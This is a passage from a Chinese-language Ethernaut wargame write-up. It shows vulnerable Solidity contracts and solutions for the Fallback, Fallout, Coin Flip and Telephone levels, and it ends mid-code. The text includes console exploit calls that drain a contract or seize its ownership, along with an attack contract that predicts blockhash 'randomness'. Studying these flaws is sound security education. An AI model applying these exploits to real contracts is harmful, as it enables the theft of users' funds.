<span class="s2">&quot;The method name is method7123949.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">method7123949</span><span class="p">()</span>
<span class="s2">&quot;If you know the password, submit it to authenticate().&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">password</span><span class="p">()</span>
<span class="s2">&quot;ethernaut0&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">authenticate</span><span class="p">(</span><span class="s2">&quot;ethernaut0&quot;</span><span class="p">)</span>
<span class="c1">// MetaMask 授权交易，等待确认</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">getCleared</span><span class="p">()</span>
<span class="kc">true</span>
</code></pre></div>
</li>
<li>
<p>查看合约所有 ABI：<code>contract.abi</code></p>
</li>
<li>完成后点击「Submit instance」验证</li>
</ul>
<h2 id="1-fallback">1. Fallback<a class="headerlink" href="#1-fallback" title="Permanent link">&para;</a></h2>
<p>阅读合约代码并达成以下目标：</p>
<ol>
<li>获得合约的所有权</li>
<li>将其余额减为 0</li>
</ol>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="c1">// Arithmetic operations revert on underflow and overflow</span>
<span class="c1">// no need to use SafeMath after v0.8.0</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Fallback</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">contributions</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 构造函数</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span><span class="w"> </span><span class="c1">// 所有者为当前调用</span>
<span class="w">    </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span>
<span class="w">            </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span>
<span class="w">            </span><span class="s2">&quot;caller is not the owner&quot;</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">        </span><span class="nx">_</span><span class="p">;</span><span class="w">  </span><span class="c1">// only used inside a function modifier and it tells Solidity to execute the rest of the code.</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">contribute</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// msg.value - 随消息发送的 wei 的数量</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0.001</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">    </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// 每次转账不能超过 0.001 以太币，想要超过原 owner 的 1000 以太币</span>
<span class="w">    </span><span class="c1">// 需要重复调用多次 contribute 函数，且测试账户也没有那么多以太币，显然不太现实</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">owner</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">getContribution</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span><span class="w"> </span><span class="c1">// 合约所有者才能将账户余额清零</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// 一个合约最多能有一个 receive 函数，不能有参数和返回值</span>
<span class="w">  </span><span class="c1">// 必须声明 external 和 payable</span>
<span class="w">  </span><span class="c1">// 当调用合约的 data 域为空时，将会执行；如果没有 receive 函数，将尝试 fallback 函数</span>
<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">contributions</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>注意到若当前交易转账金额大于 0 且调用者贡献不为 0 时，可以通过 <code>receive</code> 函数取得合约所有权</li>
<li>
<p>首先通过 <code>contribute</code> 使贡献值大于 0</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">contribute</span><span class="p">({</span><span class="nx">value</span><span class="o">:</span><span class="mf">1</span><span class="p">})</span>
</code></pre></div>
</li>
<li>
<p>向合约转账触发 <code>receive</code> 函数，执行完成后确认一下所有者</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
<span class="c1">// 或</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="nx">value</span><span class="o">:</span><span class="mf">1</span><span class="p">})</span><span class="w">  </span><span class="c1">// 发起一个交易</span>

<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
</code></pre></div>
</li>
<li>
<p>清空合约账户的余额</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">()</span>
</code></pre></div>
</li>
</ul>
<h3 id="_1">参考资料<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.soliditylang.org/en/latest/contracts.html?highlight=receive#receive-ether-function">Receive Ether Function</a></li>
<li><a href="https://web3js.readthedocs.io/en/v1.7.0/web3-eth.html?highlight=sendTransaction#sendtransaction">sendTransaction</a></li>
</ul>
<h2 id="2-fallout">2. Fallout<a class="headerlink" href="#2-fallout" title="Permanent link">&para;</a></h2>
<p>声明合约的所有权</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Fallout</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">allocations</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="cm">/* constructor */</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">Fal1out</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">owner</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="c1">// 在 v0.4.22 前，构造函数是和合约同名的函数（v0.5.0 弃用）</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">require</span><span class="p">(</span>
<span class="w">                </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span>
<span class="w">                </span><span class="s2">&quot;caller is not the owner&quot;</span>
<span class="w">            </span><span class="p">);</span>
<span class="w">            </span><span class="nx">_</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">allocate</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">sendAllocation</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">allocator</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">allocator</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">]);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">collectAllocations</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">allocatorBalance</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">allocator</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">allocations</span><span class="p">[</span><span class="nx">allocator</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>被注释为「构造函数」的函数名为 <code>Fal1out</code> 而不是 <code>Fallout</code> 意味着该函数只是普通函数可以被调用</p>
<ul>
<li>真正的构造函数只在合约创建时调用一次</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">Fal1out</span><span class="p">()</span>
</code></pre></div>
<h3 id="_2">参考资料<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
<p><a href="https://docs.soliditylang.org/en/latest/contracts.html?highlight=constructor#constructors">Constructors</a></p>
<h2 id="3-coin-flip">3. Coin Flip<a class="headerlink" href="#3-coin-flip" title="Permanent link">&para;</a></h2>
<p>需要连续猜对 10 次掷硬币的结果</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">consecutiveWins</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastHash</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">flip</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// block.number - 当前区块号</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">));</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">lastHash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">revert</span><span class="p">();</span><span class="w"> </span><span class="c1">// 无条件抛出异常</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">lastHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">FACTOR</span><span class="p">;</span><span class="w">  </span><span class="c1">// 向下取整</span>
<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">side</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>实际上 <code>side</code> 的值并非随机，区块号、区块哈希等都是公开可获取的</li>
<li>可以由另一个合约计算掷硬币的结果，并调用 <code>flip</code> 函数</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="c1">// 把需要调用的合约放在同一个文件</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">consecutiveWins</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastHash</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">flip</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">));</span>

<span class="w">    </span><span class="c1">// 当前区块号不能等于上一区块号，意味着不能使用循环重复调用 flip</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">lastHash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">revert</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">lastHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">FACTOR</span><span class="p">;</span>
<span class="w">    </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">side</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_guess</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">consecutiveWins</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">FACTOR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
<span class="w">    </span><span class="nx">CoinFlip</span><span class="w"> </span><span class="nx">coin</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">coin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CoinFlip</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">blockhash</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">number</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">));</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">blockValue</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">FACTOR</span><span class="p">;</span>
<span class="w">        </span><span class="nx">bool</span><span class="w"> </span><span class="nx">side</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">coinFlip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">        </span><span class="nx">coin</span><span class="p">.</span><span class="nx">flip</span><span class="p">(</span><span class="nx">side</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>使用 Remix 部署合约</p>
<p><img alt="部署合约" src="../img/ethernaut01.jpg" /></p>
<p>执行 10 次 <code>exploit</code> 函数</p>
<p><img alt="掷硬币 XD" src="../img/ethernaut02.jpg" /></p>
<p>可以使用 <a href="https://docs.chain.link/docs/get-a-random-number">Chainlink VRF</a> 来获得安全的随机数</p>
<h3 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<p><a href="https://remix-ide.readthedocs.io/en/latest/run.html">Deploy &amp; Run — Remix - Ethereum IDE 1 documentation</a></p>
<h2 id="4-telephone">4. Telephone<a class="headerlink" href="#4-telephone" title="Permanent link">&para;</a></h2>
<p>声明合约的所有权</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Telephone</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">changeOwner</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// tx.origin - 交易的发起者</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>用户通过合约 A 调用合约 B<ul>
<li>对于合约 A：<code>tx.origin</code> 和 <code>msg.sender</code> 都是用户</li>
<li>对于合约 B：<code>tx.origin</code> 是用户，<code>msg.sender</code> 是合约 A</li>
</ul>
</li>
<li>当交易发起者的地址与当前调用者的地址不相同时，可以更新合约所有者，显然需要通过另一个合约来调用 <code>changeOwner</code></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Telephone</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
